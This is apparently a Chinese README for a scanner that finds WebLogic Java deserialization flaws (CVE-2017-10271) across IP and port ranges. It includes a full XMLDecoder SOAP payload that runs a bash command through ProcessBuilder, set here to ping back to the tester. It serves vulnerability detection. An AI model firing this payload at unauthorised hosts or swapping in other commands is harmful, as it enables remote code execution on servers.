# java反序列化漏洞检测

针对类似CVE-2017-10271漏洞的一个java反序列化漏洞扫描器，此项目中只有一个poc，其他暂时未做整理。

## 安装

1. 安装nmap

   ​	https://nmap.org/download.html 根据操作系统的不同，下载不同的版本安装。

2. 安装第三方包

   `pip install -r requirements.txt`

3. 扫描

   修改poc，将ping命令中的ip地址改为自己的ip地址

   修改第25行sniff代码

   ```
   sniff(filter='icmp and yourIP',prn=packet_callback)
   ```

   `java_scan.py -i IP地址 [options]
   java_scan.py -h 获得帮助`

## 使用

#### 1.poc

> 使用前务必修改poc，将ping命令中的ip地址改为自己的ip地址

poc为两个json格式的文件分别适用于windows和linux（目前并没有加入指定poc路径的功能，后续版本中将加入该功能）请务必在程序目录使用poc.json和poc_win.json命名poc。

关于poc的格式（linux版，windows版类似）

```json
{
  "url":"wls-wsat/CoordinatorPortType",
  "header": "Content-Type:text/xml",
  "data": [
    "<soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/'>",
        "<soapenv:Header>",
            "<work:WorkContext xmlns:work='http://bea.com/2004/06/soap/workarea/'>",
               "<java version='1.8.0_131' class='java.beans.XMLDecoder'>",
                    "<void class='java.lang.ProcessBuilder'>",
                        "<array class='java.lang.String' length='3'>",
                            "<void index='0'>",
                                "<string>/bin/bash</string>",
                            "</void>",
                            "<void index='1'>",
                                "<string>-c</string>",
                            "</void>",
                            "<void index='2'>",
                                "<string>ping 10.60.18.5 -c 2</string>",
                            "</void>",
                        "</array>",
                    "<void method='start'/></void>",
                "</java>",
            "</work:WorkContext>",
        "</soapenv:Header>",
        "<soapenv:Body/>",
    "</soapenv:Envelope>"
  ]
}
```

url指定漏洞利用的目录，header指定post包中新加入的header内容，data是要发送的序列化的内容。

**注意此poc要让漏洞主机返回2个ping包，程序检测到ICMP包时才能确定漏洞存在。**

#### 2.使用nmap对局域网进行扫描

程序默认扫描是调用的nmap对局域网进行扫描

```
java_scan.py -i 192.168.0.1
```

这样扫描是对192.168.0.1的主机的7001端口进行扫描

#### 3.指定ip和端口

指定单个ip和端口

`java_scan.py -i 192.168.0.1 -p 7001`

指定多个ip和多个端口

`java_scan.py -i 192.168.0.1,2,55 -p 7001,8001,9001`

指定ip范围和端口范围

`java_scan.py -i 192.168.0.1-255 -p 7000-8000` 

#### 4.快速的端口开放探测

使用-f参数，将调用socket对端口进行快速探测

`java_scan.py -i 192.168.0.1-255 -p 7001 -f`

指定快速端口探测的线程数

`java_scan.py -i 192.168.0.1-255 -p 7001 -f -t 100`

#### 5.效果

![effect](https://github.com/ETOCheney/JavaDeserialization/blob/master/images/final.png)